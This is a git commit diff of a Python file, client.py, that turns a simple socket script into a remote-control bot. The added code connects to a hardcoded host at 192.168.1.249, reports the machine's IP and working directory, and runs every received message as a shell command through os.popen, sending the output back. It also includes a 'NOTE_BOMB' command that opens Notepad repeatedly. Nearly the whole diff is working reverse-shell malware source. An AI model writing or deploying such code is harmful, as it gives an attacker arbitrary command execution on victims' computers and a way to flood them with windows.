6a3f21e252f089a80036a27880942b6401dfa272
Saw8888 <71344333+Saw8888@users.noreply.github.com>
2021-09-12 19:59:57 +0200

    Update client.py

--- client.py
+++ client.py
@@ -1,18 +1,43 @@
 import socket
 import os
 
-server = socket.socket()
-host = '127.0.0.1'
-port = 6759
+client_ip = socket.gethostbyname(socket.gethostname())
+class Client:
+    def __init__(self):
+        self.host = '192.168.1.249'
+        self.port = 6758
+        self.server = socket.socket()
+
+    def connect(self):
+        self.server.connect((self.host,self.port))
+
+    def send(self,text):
+        self.server.send(str(text).encode('UTF-8'))
+
+    def recv(self):
+        self.msg = self.server.recv(1024)
+        return self.msg.decode('UTF-8')
+
+class Operate:
+    def __init__(self):
+        self.serv = Client()
+        self.serv.connect()
+        
+    def hack(self):
+        self.serv.send('{0} , {1} > '.format(client_ip,str(os.getcwd())))
+        self.msg = self.serv.recv()
+        if self.msg.split(' ')[0] == 'NOTE_BOMB':
+            for i in range(int(self.msg.split(' ')[1])):
+                data = os.popen('notepad.exe')
+
+        else:
+            data = os.popen(self.msg)
+        self.serv.send('recived : '+str(data.read()))
+
 
 run = True
-server.connect((host,port))
+
+bot = Operate()
 while run:
-
-
-    msg = server.recv(1024)
-    os.popen(msg.decode('UTF-8'))
-
-    server.send('Client online . . .'.encode('UTF-8'))
-
+    bot.hack()
 
